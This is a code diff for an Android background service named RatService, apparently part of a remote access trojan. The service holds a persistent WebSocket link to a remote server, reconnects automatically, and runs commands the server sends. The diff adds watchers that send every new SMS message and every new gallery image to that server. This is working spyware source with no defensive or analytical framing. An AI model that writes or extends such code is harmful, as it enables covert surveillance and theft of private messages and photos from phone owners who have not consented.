@@ -11,34 +11,56 @@ import okhttp3.*
 import java.util.concurrent.TimeUnit
 
 class RatService : Service() {
+
     private val client = OkHttpClient.Builder()
         .readTimeout(0, TimeUnit.MILLISECONDS)
         .pingInterval(20, TimeUnit.SECONDS)
         .build()
+
     private var ws: WebSocket? = null
     private val gson = Gson()
     private var deviceId: String = ""
     private var running = true
     private lateinit var handler: CommandHandler
+    private var smsWatcher: SmsWatcher? = null
+    private var galleryWatcher: GalleryWatcher? = null
 
     override fun onCreate() {
         super.onCreate()
         deviceId = android.provider.Settings.Secure.getString(
-            contentResolver, android.provider.Settings.Secure.ANDROID_ID
+            contentResolver,
+            android.provider.Settings.Secure.ANDROID_ID
         ) ?: "unknown"
         handler = CommandHandler(this, deviceId)
+
+        smsWatcher = SmsWatcher(this) { sms ->
+            sendEvent(mapOf(
+                "type" to "sms_new",
+                "data" to sms
+            ))
+        }
+
+        galleryWatcher = GalleryWatcher(this) { img ->
+            sendEvent(mapOf(
+                "type" to "gallery_new",
+                "data" to img
+            ))
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForeground(1, buildNotification())
         connect()
         startHeartbeat()
+        smsWatcher?.start()
+        galleryWatcher?.start()
         return START_STICKY
     }
 
     private fun buildNotification(): Notification {
         val pi = PendingIntent.getActivity(
-            this, 0, Intent(this, MainActivity::class.java),
+            this, 0,
+            Intent(this, MainActivity::class.java),
             PendingIntent.FLAG_IMMUTABLE
         )
         return NotificationCompat.Builder(this, App.CHANNEL_ID)
@@ -59,6 +81,7 @@ class RatService : Service() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 sendInfo(webSocket)
             }
+
             override fun onMessage(webSocket: WebSocket, text: String) {
                 try {
                     val obj = gson.fromJson(text, JsonObject::class.java)
@@ -72,17 +95,19 @@ class RatService : Service() {
                                 addProperty("commandId", id)
                                 add("result", gson.toJsonTree(result))
                             }
-                            webSocket.send(gson.toJson(payload))
+                            try { webSocket.send(gson.toJson(payload)) } catch (_: Exception) {}
                         }
                     }
                 } catch (_: Exception) {}
             }
+
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                 if (running) {
                     Thread.sleep(App.config.reconnectDelayMs)
                     connect()
                 }
             }
+
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                 if (running) {
                     Thread.sleep(App.config.reconnectDelayMs)
@@ -90,6 +115,16 @@ class RatService : Service() {
                 }
             }
         })
+    }
+
+    private fun sendEvent(data: Map<String, Any>) {
+        try {
+            val payload = JsonObject().apply {
+                addProperty("type", "event")
+                add("data", gson.toJsonTree(data))
+            }
+            ws?.send(gson.toJson(payload))
+        } catch (_: Exception) {}
     }
 
     private fun sendInfo(socket: WebSocket) {
@@ -113,6 +148,8 @@ class RatService : Service() {
 
     override fun onDestroy() {
         running = false
+        smsWatcher?.stop()
+        galleryWatcher?.stop()
         try { ws?.close(1000, "stop") } catch (_: Exception) {}
         super.onDestroy()
     }
